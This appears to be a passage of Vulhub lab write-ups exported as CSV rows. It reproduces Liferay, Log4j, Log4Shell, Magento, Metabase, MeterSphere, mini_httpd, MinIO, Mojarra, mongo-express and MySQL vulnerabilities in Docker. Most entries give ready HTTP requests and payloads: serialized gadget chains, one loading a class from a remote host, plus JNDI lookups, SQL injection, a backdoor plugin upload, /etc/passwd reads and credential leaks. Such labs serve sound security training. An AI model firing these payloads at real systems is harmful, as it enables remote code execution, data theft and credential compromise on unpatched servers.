defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={""userOverridesAsString"":""HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740017687474703a2f2f3137322e31372e302e313a383030302f740003466f6f;""}


Send the payload in an HTTP POST request:


POST /api/jsonws/invoke HTTP/1.1
Host: your-ip:8080
Content-Length: 1346
Content-Type: application/x-www-form-urlencoded
Connection: close

cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=o3lt8q1F&formDate=1585270368703&tableId=1&name=2&type=3&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={""userOverridesAsString"":""HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740017687474703a2f2f3137322e31372e302e313a383030302f740003466f6f;""}




Enter the container and verify that /tmp/success has been created, indicating successful code execution:
-------------------------------------------------------------------------------","https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html
https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/
https://xz.aliyun.com/t/7499
https://xz.aliyun.com/t/7485
http://evil/"
log4j,CVE-2017-5645,Apache Log4j TCP Server Deserialization Remote Code Execution (CVE-2017-5645),"Apache Log4j TCP Server Deserialization Remote Code Execution (CVE-2017-5645)

中文版本(Chinese version)

Apache Log4j is a logging library for Java that supports starting remote logging servers. A security vulnerability exists in versions 2.x before 2.8.2 of Apache Log4j TCP Server. Attackers can exploit this vulnerability to execute arbitrary code.

References:
https://issues.apache.org/jira/browse/LOG4J2-1863
https://github.com/pimps/CVE-2017-5645

Environment Setup

Execute the following command to start a Log4j 2.8.1 TCP server:


docker compose up -d


After the environment starts, a TCP server will be opened on port 4712.

Note: Besides using Vulhub's docker image to set up the environment, we can directly start this TCP server from the command line after downloading the log4j jar files: java -cp ""log4j-api-2.8.1.jar:log4j-core-2.8.1.jar:jcommander-1.72.jar"" org.apache.logging.log4j.core.net.server.TcpSocketServer, without needing to use Vulhub or write code.

Vulnerability Reproduction

We use ysoserial to generate a payload, then send it directly to the your-ip:4712 port.


java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 ""touch /tmp/success"" | nc your-ip 4712


Then execute docker compose exec log4j bash to enter the container, and you can see that /tmp/success has been successfully created:



Execute a reverse shell command to successfully get a shell:
-------------------------------------------------------------------------------","https://issues.apache.org/jira/browse/LOG4J2-1863
https://github.com/pimps/CVE-2017-5645"
log4j,CVE-2021-44228,Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228),"Apache Log4j2 lookup feature JNDI injection (CVE-2021-44228)

中文版本(Chinese version)

Apache Log4j 2 is an upgrade to Log4j that provides significant improvements over its predecessor, Log4j 1.x, and provides many of the improvements available in Logback while fixing some inherent problems in Logback's architecture.

On Dec 2021, a 0-day exploit in the Apache Log4j2 was discovered. Log4j’s JNDI support has not restricted what names could be resolved. Some protocols like rmi: and ldap: are unsafe or can allow remote code execution.

References:
https://logging.apache.org/log4j/2.x/security.html
https://www.lunasec.io/docs/blog/log4j-zero-day/
https://xz.aliyun.com/t/10649

Vulnerability Environment

Apache Log4j2 is not a certain web service, it is just a third-party library, so we can use a application that depend on Log4j2 to demonstrate how to exploit this vulnerability.

Execute following command to start a Apache Solr 8.11.0, which use Log4j 2.14.1:


docker compose up -d


After server start, browse http://your-ip:8983 to see the admin portal of Apache Solr.

Exploit

Simply, put the payload ${jndi:dns://${sys:java.version}.example.com} as the admin action that can trigger the JNDI query.


GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com} HTTP/1.1
Host: your-ip:8983
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close




Query will be shown at the DNS log:



Because the target JDK version is below 8u191, we can use rmi:// or ldap:// to run the Java bytecode directly.

For vulnerability exploitation, you can use the Java Chains. First, visit the Quick Start page to set up Java Chains. Then, follow the JNDI Basic Exploitation Guide to configure the command touch /tmp/success and generate a JNDI LDAP URL Payload. Finally, replace the payload in the previous HTTP request to successfully exploit the vulnerability.



As you can see, touch /tmp/success is succesful executed:
-------------------------------------------------------------------------------","https://logging.apache.org/log4j/2.x/security.html
https://www.lunasec.io/docs/blog/log4j-zero-day/
https://xz.aliyun.com/t/10649"
magento,Unknown,Magento 2.2 SQL Injection,"Magento 2.2 SQL Injection

中文版本(Chinese version)

Magento is a professional open-source e-commerce platform developed in PHP using the Zend Framework. It is designed to be highly flexible with a modular architecture and rich functionality.

A bug exists in its prepareSqlCondition function where a second string formatting introduces an unexpected single quote, leading to an SQL injection vulnerability.

References:
https://www.ambionics.io/blog/magento-sqli
https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html

Environment Setup

Execute the following command to start Magento 2.2.7:


docker compose up -d


After the server starts, visit http://your-ip:8080 to see the Magento installation page. During installation, set the database address to mysql, username and password both as root, and keep other settings as default:



Vulnerability Reproduction

Visit the following links:
http://your-ip:8080/catalog/productfrontendaction/synchronize?typeid=recentlyproducts&ids[0][addedat]=&ids[0][productid][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-
http://your-ip:8080/catalog/productfrontendaction/synchronize?typeid=recentlyproducts&ids[0][addedat]=&ids[0][productid][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-

You can see that when executing ))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- - and ))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -, the returned HTTP status codes are different:





By changing the OR condition, you can perform SQL boolean-based blind injection.

Using this POC, you can read the administrator's session:
-------------------------------------------------------------------------------","https://www.ambionics.io/blog/magento-sqli
https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html"
metabase,CVE-2023-38646,Metabase Pre-Auth JDBC Remote Code Execution (CVE-2023-38646),"Metabase Pre-Auth JDBC Remote Code Execution (CVE-2023-38646)

中文版本(Chinese version)

Metabase is an open source data analytics platform.

Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow unauthenticated attackers to execute arbitrary commands on the server, at the server's privilege level. This issue is caused by JDBC url attacks in the setup request.

References:
<https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
<https://blog.calif.io/p/reproducing-cve-2023-38646-metabase
<https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA

Vulnerable environment

Execute following command to start a Metabase server 0.46.6:


docker compose up -d


After the server is started, you can browse the http://your-ip:3000 to see the installation instructions like that:



Fill in your information, and skip the data source form.

Exploit

Firstly, use following request to retrieve the setup-token:


GET /api/session/properties HTTP/1.1
Host: localhost:3000
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Connection: close
Cache-Control: max-age=0






The vulnerability can only be exploited by obtaining this setup token.

Secondly, replace your [setup-token] into the following request then send it:


POST /api/setup/validate HTTP/1.1
Host: localhost:3000
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 739

{
    ""token"": ""[setup-token]"",
    ""details"":
    {
        ""isondemand"": false,
        ""isfullsync"": false,
        ""is_sample"": false,
        ""cache_ttl"": null,
        ""refingerprint"": false,
        ""autorunqueries"": true,
        ""schedules"":
        {},
        ""details"":
        {
            ""db"": ""zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;"",
            ""advanced-options"": false,
            ""ssl"": true,
""init"": ""CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('touch /tmp/success')\u000A$$""
        },
        ""name"": ""an-sec-research-team"",
        ""engine"": ""h2""
    }
}


As you can see, touch /tmp/success has been executed successfully:
-------------------------------------------------------------------------------","https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
https://blog.calif.io/p/reproducing-cve-2023-38646-metabase
https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA"
metabase,CVE-2021-41277,Metabase Pre-Auth Local File Inclusion (CVE-2021-41277),"Metabase Pre-Auth Local File Inclusion (CVE-2021-41277)

中文版本(Chinese version)

Metabase is an open source data analytics platform. In affected versions (x.40.0-x.40.4) a security issue has been discovered with the custom GeoJSON map (admin-settings-maps-custom maps-add a map) support, unauthenticated attackers can use this vulnerability to read local file (including environment variables).

References:
<https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr
<https://github.com/tahtaciburak/CVE-2021-41277

Environment Setup

Execute following command to start a Metabase server 0.40.4:


docker compose up -d


After the server is started, you can browse the http://your-ip:3000 to see the installation instructions like that:



Fill in your information, and skip the data source form.

Vulnerability Reproduce

Simplely use the CURL to exploit this flaw:


curl -v http://your-ip:3000/api/geojson?url=file:////etc/passwd


As you can see, /etc/passwd has been exposed successfully.
-------------------------------------------------------------------------------","https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr
https://github.com/tahtaciburak/CVE-2021-41277
http://your-ip:3000/api/geojson?url=file:////etc/passwd"
metersphere,Unknown,MeterSphere Plugin Endpoint Remote Code Execution,"MeterSphere Plugin Endpoint Remote Code Execution

中文版本(Chinese version)

MeterSphere is a one-stop open source continuous testing platform under the GPL v3 open source license.

In the version v1.16.3 and before, MeterSphere's plugin API is unauthenticated and the attackers are able to upload plugins to the server and execute arbitrary code.

References:
<https://xz.aliyun.com/t/10772

Vulnerable environment

Execute following command to start a MeterSphere server v1.16.3:


docker compose up -d


After the server is fully initialized, you can see the login page of MeterSphere on http://your-ip:8081.

Exploit

Firstly, by visiting http://your-ip:8081/plugin/list, you can see that the success message is returned without being redirected to the login page, indicating that the plugin API can be accessed without authorization.



Then, you should create a crafted evil plugin. Vulhub prepares a pre-built backdoor jar for it: <https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0.

Upload the evil jar plugin to /plugin/add interface:


POST /plugin/add HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWXsd
Content-Length: 11985
-----WebKitFormBoundaryJV2KX1EL5qmKWXsd
Content-Disposition: form-data; name=""file""; filename=""Evil.jar""

[Paste your jar file]
-----WebKitFormBoundaryJV2KX1EL5qmKWXsd--





Take care of bytes encoding by yourself if you use Burpsuite to send the package.

Althrough there is an error message is respond, the JAR package path is already added into URL classloader which means we can exploit it.

Use following request to execute arbitrary command:


POST /plugin/customMethod HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 89

{
  ""entry"": ""org.vulhub.Evil"",
  ""request"": ""id""
}
-------------------------------------------------------------------------------","https://xz.aliyun.com/t/10772
https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0"
metersphere,CVE-2021-45788,MeterSphere v1.15.4 Authenticated SQL Injection (CVE-2021-45788),"MeterSphere v1.15.4 Authenticated SQL Injection (CVE-2021-45788)

中文版本(Chinese version)

MeterSphere is a one-stop open source continuous testing platform under the GPL v3 open source license.

In the version v1.15.4 and before, MeterSphere's testcase related APIs have order-by based SQL injection.

References:
<https://github.com/metersphere/metersphere/issues/8651

Vulnerable environment

Execute following command to start a MeterSphere server v1.15.4:


docker compose up -d


After the server is fully initialized, you can see the login page of MeterSphere on http://your-ip:8081.

Exploit

Firstly, login to the panel by username admin and password metersphere.

Add a new testcase at http://your-ip:8081/#/track/case/all:



Then, send the following request to test if SQL injection exists (replace csrf token and session id with yours):


POST /test/case/list/1/10 HTTP/1.1
Host: localhost.lan:8081
Content-Length: 3142
Accept: application/json, text/plain, /
CSRF-TOKEN: [Your CSRF Token]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Cookie: MSSESSIONID=[Your Session ID]
Connection: close

{""orders"":[{""name"":""name"",""type"":"",if(1=1,sleep(2),0)""}],""components"":[{""key"":""name"",""name"":""MsTableSearchInput"",""label"":""commons.name"",""operator"":{""value"":""like"",""options"":[{""label"":""commons.advsearch.operators.like"",""value"":""like""},{""label"":""commons.advsearch.operators.notlike"",""value"":""not like""}]}},{""key"":""tags"",""name"":""MsTableSearchInput"",""label"":""commons.tag"",""operator"":{""value"":""like"",""options"":[{""label"":""commons.advsearch.operators.like"",""value"":""like""},{""label"":""commons.advsearch.operators.notlike"",""value"":""not like""}]}},{""key"":""module"",""name"":""MsTableSearchInput"",""label"":""testtrack.case.module"",""operator"":{""value"":""like"",""options"":[{""label"":""commons.advsearch.operators.like"",""value"":""like""},{""label"":""commons.advsearch.operators.notlike"",""value"":""not like""}]}},{""key"":""priority"",""name"":""MsTableSearchSelect"",""label"":""testtrack.case.priority"",""operator"":{""options"":[{""label"":""commons.advsearch.operators.in"",""value"":""in""},{""label"":""commons.advsearch.operators.notin"",""value"":""not in""}]},""options"":[{""label"":""P0"",""value"":""P0""},{""label"":""P1"",""value"":""P1""},{""label"":""P2"",""value"":""P2""},{""label"":""P3"",""value"":""P3""}],""props"":{""multiple"":true}},{""key"":""createTime"",""name"":""MsTableSearchDateTimePicker"",""label"":""commons.createtime"",""operator"":{""options"":[{""label"":""commons.advsearch.operators.between"",""value"":""between""},{""label"":""commons.advsearch.operators.gt"",""value"":""gt""},{""label"":""commons.advsearch.operators.ge"",""value"":""ge""},{""label"":""commons.advsearch.operators.lt"",""value"":""lt""},{""label"":""commons.advsearch.operators.le"",""value"":""le""},{""label"":""commons.advsearch.operators.equals"",""value"":""eq""}]}},{""key"":""updateTime"",""name"":""MsTableSearchDateTimePicker"",""label"":""commons.updatetime"",""operator"":{""options"":[{""label"":""commons.advsearch.operators.between"",""value"":""between""},{""label"":""commons.advsearch.operators.gt"",""value"":""gt""},{""label"":""commons.advsearch.operators.ge"",""value"":""ge""},{""label"":""commons.advsearch.operators.lt"",""value"":""lt""},{""label"":""commons.advsearch.operators.le"",""value"":""le""},{""label"":""commons.advsearch.operators.equals"",""value"":""eq""}]}},{""key"":""creator"",""name"":""MsTableSearchSelect"",""label"":""apitest.creator"",""operator"":{""options"":[{""label"":""commons.advsearch.operators.in"",""value"":""in""},{""label"":""commons.advsearch.operators.notin"",""value"":""not in""},{""label"":""commons.advsearch.operators.currentuser"",""value"":""current user""}]},""options"":{""url"":""/user/list"",""labelKey"":""name"",""valueKey"":""id""},""props"":{""multiple"":true}},{""key"":""reviewStatus"",""name"":""MsTableSearchSelect"",""label"":""testtrack.reviewview.executeresult"",""operator"":{""options"":[{""label"":""commons.advsearch.operators.in"",""value"":""in""},{""label"":""commons.advsearch.operators.notin"",""value"":""not in""}]},""options"":[{""label"":""testtrack.review.prepare"",""value"":""Prepare""},{""label"":""testtrack.review.pass"",""value"":""Pass""},{""label"":""testtrack.review.unpass"",""value"":""UnPass""}],""props"":{""multiple"":true}}],""filters"":{""reviewStatus"":[""Prepare"",""Pass"",""UnPass""]},""planId"":"""",""nodeIds"":[],""selectAll"":false,""unSelectIds"":[],""selectThisWeedData"":false,""selectThisWeedRelevanceData"":false,""caseCoverage"":null}


As you can see, a 2 seconds sleep successful:



Use SQLMap to retrieve the database username:


python sqlmap.py -r req.txt --dbms mysql --technique T --prefix , --level 3
python sqlmap.py -r req.txt --dbms mysql --technique T --prefix , --level 3 --current-user
-------------------------------------------------------------------------------",https://github.com/metersphere/metersphere/issues/8651
mini_httpd,CVE-2018-18778,ACME mini_httpd Arbitrary File Read (CVE-2018-18778),"ACME mini_httpd Arbitrary File Read (CVE-2018-18778)

中文版本(Chinese version)

ACME minihttpd is a tiny HTTP server that maintains a certain level of performance (about 90% of Apache) while consuming minimal system resources. Therefore, it is widely used as an embedded server in various IoT devices (routers, switches, cameras, etc.). Devices from manufacturers including Huawei, zyxel, Hikvision, and Raspberry Pi have used the Minihttpd component.

When mini_httpd is running in virtual host mode, user requests to http://HOST/FILE will access the HOST/FILE file in the current directory.

c
(void) snprintf( vfile, sizeof(vfile), ""%s/%s"", req_hostname, f );


Looking at the code above, the analysis is as follows:
When HOST=example.com and FILE=index.html, the above statement results in example.com/index.html, and the file is read normally.
When HOST is empty and FILE=etc/passwd, the above statement results in /etc/passwd.

The latter is treated as an absolute path, thus reading /etc/passwd, causing an arbitrary file read vulnerability.

Reference:
https://nvd.nist.gov/vuln/detail/CVE-2018-18778
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2018/CVE-2018-18778.yaml

Environment Setup

Execute the following command to start mini_httpd 1.29:


docker compose up -d


After the server starts, visit http://your-ip:8080 to see the web page.

Vulnerability Reproduction

Send a request with an empty Host header and the absolute file path as the PATH value:


GET /etc/passwd HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close




Successfully read the file:
-------------------------------------------------------------------------------","https://nvd.nist.gov/vuln/detail/CVE-2018-18778
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2018/CVE-2018-18778.yaml"
minio,CVE-2023-28432,MinIO Information Disclosure in Cluster Deployment (CVE-2023-28432),"MinIO Information Disclosure in Cluster Deployment (CVE-2023-28432)

中文版本(Chinese version)

MinIO is a High Performance Object Storage released under GNU Affero General Public License v3.0.

In the version before RELEASE.2023-03-20T20-16-18Z, there is an information disclosure vulnerability if MinIO is deployed in cluster mode. An attacker can use an HTTP request to obtain all environment variables of the target process, including MINIOROOTUSER and MINIOROOTPASSWORD.

References:
<https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
<https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ

Vulnerable Environment

Executing following commands to start a MinIO cluster:


docker compose up -d


After the cluster has been started, you can browse Web console on http://your-ip:9001, API server on http://your-ip:9000.

Vulnerability Reproduce

The issue exists in the API endpoint http://your-ip:9000/minio/bootstrap/v1/verify. Send the request to retrieve all environment variables:


POST /minio/bootstrap/v1/verify HTTP/1.1
Host: your-ip:9000
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0






It can be seen that MINIOROOTUSER and MINIOROOTPASSWORD is exposed.

Success to use this username and password to login the Web console:
-------------------------------------------------------------------------------","https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ"
mojarra,Unknown,Mojarra JSF ViewState Deserialization Vulnerability,"Mojarra JSF ViewState Deserialization Vulnerability

中文版本(Chinese version)

JavaServer Faces (JSF) is a standard for building Web applications, and Mojarra is a framework that implements JSF. The Mojarra that before 2.1.29-08 and 2.0.11-04, is not configured to encrypt the ViewState, so the web application may have a serious remote code execution (RCE) vulnerability.

Reference links:
https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html
https://www.exploit-db.com/docs/48126
https://www.synacktiv.com/ressources/JSFViewStateInYourFace.pdf

Setup

Execute the following command to start a JSF application which using JDK7u21 and Mojarra 2.1.28:


docker compose up -d


After the application is started, visit http://your-ip:8080 to see the demo page.

Exploit

Here is the structure of ViewState that encoding without a security layer:



According to this structure, we can use ysoserial's Jdk7u21 Gadget to generate a payload:


$ java -jar ysoserial-master-SNAPSHOT.jar Jdk7u21 ""touch /tmp/success"" | gzip | base64 -w 0
H4sIAAVGF18AA61WzW8bRRR/Yye2Y9zmo/lsaZvQlnxAd/PlJsURbT5Ia3BIhNNUwocwXk/sbde7293ZZINEb/wBCJX/AJBoOPRCqx6QKm4tFyQkUFEluHADDhUSFz7e7G5iKwnYLV1pd2bf17z35jdv3tYv0Ghb0HWFrlPJ4aomZVT9KitcpHYpy/j32ndv33g0dCwE4FrQWpEK+Hfn3r/x0Z3b42HkmxsJAGg5dx7EE0KrryhGWbIdXTKsokRNqpSY5FKN6pKqc2bpVJNcW+OKxC3qSsusbGqUMzuNY9PlxXv61s2xMETScGBV1QtM52865Tyz0nBwFRV0W2M8jXQ3B/HV/CZnilFgNodwLjeTg8iqolEbf9tyGeG2jMsW5VlBS2WgcVWnZYbMKl6WW6peRGbrquFw0+FLlmEyi6vCaKcvKGKXK/SUa4pY/8bHsbyF3/izp6NY/GFCJEzwQkgP5Wa2Hnf9EYkt/xiQI5/d/+vul8gehbNxCMMLUZiIwqkovEigxWaWSrUVZtmqoV9KzxEgrxM4MGvoNqc6X6Gawxo/7/3w8QePfnuVQGRK1VWOk/DA4AqBhlnMAoFm3Ebm52uZ5jWktGUMBc1SNI7/AbGBl1SbwKEsd/LLQU6X6KZm0AKBRFrXmeWljKFQMrNpG75zsunL2H5CLtBCkXH75D5WUgSavM1aM6wyAWsgg5iQERMyYkL2MSF7mJC3MSF7mJDnFhdSuX2ly1pF1vdHfZdZcjaYUo55u0j1gsaslEhJrGAoThnxQ+D0Ey2PqiXfDoY/8/+dIRB/zVWYKWh2FPoJfPJk+ajpQYGX5bnlhWlXtdNIotywaivVlUM1MCdw8DReEIgGuSQw/SwymTUcS2HzqoBxIkCgJA5pAuLwXBQGCIw9BWAJnK93RyxH52qZydN5GyGu8G1LBNq9YqEaFee903a2XsvblnbQQuB4jVhwi6YULSgFrZWq9pbvZBSGMGcoGPwT6BgYzOwRSyXgZTgdh5dAworBDUcp9cq8bKLXisJsOwbDWDSYyxQC/QN7i2e1SSyTQgVNjsKYMDmOVSzLqXJ1gZpB/amKamkDi83oxPBIMpmcnBgZGR8Zm0CNvkwNkRT0QQhrKPqF72FohAiOUVF7IebREA74FZeTjCPBsXHoNpBbnsgB/EY8ogwH8ZvwBaAZJnHE0gjtKCWUz+EbFrTdiuOeYq/PDBTFrAM6PT6BLuhGjR6c+z4Ks0cCs2mPuo/ZSc/skM/c1+zzcBQ1xOwYHMflKwvEYHAn6JPIEVLNn0KYZO6A3DbyBSQv3/IUz3hBESHR663fB604xpEVghPQAk3ONbiOtoB8u3NnHRF3VkcUuqLQHYWeeu+saz+rv06VL3Q/mzsrPG8Ye+6oUzXvKNSqp3ocJnCiDlMYegXwi/krTPn301/rBP8njkn9OJ7aheM2j3/I+7ZX7W6n2F2TQwMeK8vcIODa73mYOCr8dyUsyNLO1V3pztztblHELFlsTcOgJTzs7uZP/Q97v26ZfRACkgFS4rgdlewEknJaX8dNrS7mrom94qjoE7etUV03uCcjTe9M9yheuv97c8eD6x+HIJSBRJkJ4HhIw36tuapfw3KDXV0D3zSx42vd0w16y+9qbVGlMfrw3led73yDR2Me4mK75rHGG9h+NvGSxeySoRVcM+h2Exsx0fuK9HGIrSVpkp4ZnhQnJ+auWzUyCpXHNd1/AEKwhdeSCwAA


Then, intercept and modify the http request from demo page, put the url-encoded payload into value of javax.faces.ViewState field:



touch /tmp/success has been successfully executed:
-------------------------------------------------------------------------------","https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html
https://www.exploit-db.com/docs/48126
https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf"
mongo-express,CVE-2019-10758,Mongo Express Remote Code Execution (CVE-2019-10758),"Mongo Express Remote Code Execution (CVE-2019-10758)

中文版本(Chinese version)

mongo-express is a third-party Web interface for MongoDB, developed using Node.js and Express. If an attacker can successfully log in, or if the target server hasn't changed the default credentials (admin:pass), they can execute arbitrary Node.js code.

Environment Setup

Execute the following command to start mongo-express version 0.53.0:

bash
docker compose up -d


After the environment starts, visit http://your-ip:8081 to access the Web interface.

Vulnerability Reproduction

Send the following HTTP request to execute the code this.constructor.constructor(""return process"")().mainModule.require(""child_process"").execSync(""touch /tmp/success""):


POST /checkValid HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Basic YWRtaW46cGFzcw==
Content-Type: application/x-www-form-urlencoded
Content-Length: 124

document=this.constructor.constructor(""return process"")().mainModule.require(""child_process"").execSync(""touch /tmp/success"")


As you can see, the touch /tmp/success command has been executed successfully:
-------------------------------------------------------------------------------",
mysql,CVE-2012-2122,MySQL Authentication Bypass (CVE-2012-2122),"MySQL Authentication Bypass (CVE-2012-2122)

中文版本(Chinese version)

When connecting to MariaDB/MySQL, the input password is compared with the expected correct password. Due to improper handling, even if memcmp() returns a non-zero value, MySQL may still consider the two passwords to be identical. This means that with just a username, repeated login attempts can lead to successful database access.

Affected versions:
MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.
MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.

Reference links:
http://www.freebuf.com/vuls/3815.html
https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/

Environment Setup

Through testing, although this environment runs in a container, the ability to reproduce the vulnerability still has some dependency on the host machine. The host machine is best run on Ubuntu or Mac systems, but success is not guaranteed. You are welcome to submit more test results in Issues.

Execute the following command to start the test environment:


docker compose up -d


After the environment starts, a MySQL service (version: 5.5.23) will be launched, listening on port 3306. You can log in directly through a normal MySQL client, the correct root password is 123456.

Vulnerability Reproduce

Without knowing the correct password for our environment, run the following command in bash, and after a certain number of attempts, you should be able to successfully log in:

bash
for i in seq 1 1000; do mysql -uroot -pwrong -h your-ip -P3306 ; done




For more testing and exploitation methods, see the reference links.
-------------------------------------------------------------------------------","http://www.freebuf.com/vuls/3815.html
https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/"
nacos,CVE-2021-29442,Alibaba Nacos Authentication Bypass and Remote Code Execution (CVE-2021-29442),"Alibaba Nacos Authentication Bypass and Remote Code Execution (CVE-2021-29442)

中文版本(Chinese version)

Nacos is an easy-to-use platform designed for dynamic service discovery and configuration and service management.

In the Nacos version before 1.4.1, some API endpoints such as /nacos/v1/cs/ops/derby are not protected and can be openly accessed by unauthenticated users. Attackers are able to execute arbitrary SQL statement and Java code.

References:
<https://github.com/advisories/GHSA-xv5h-v7jh-p2qh
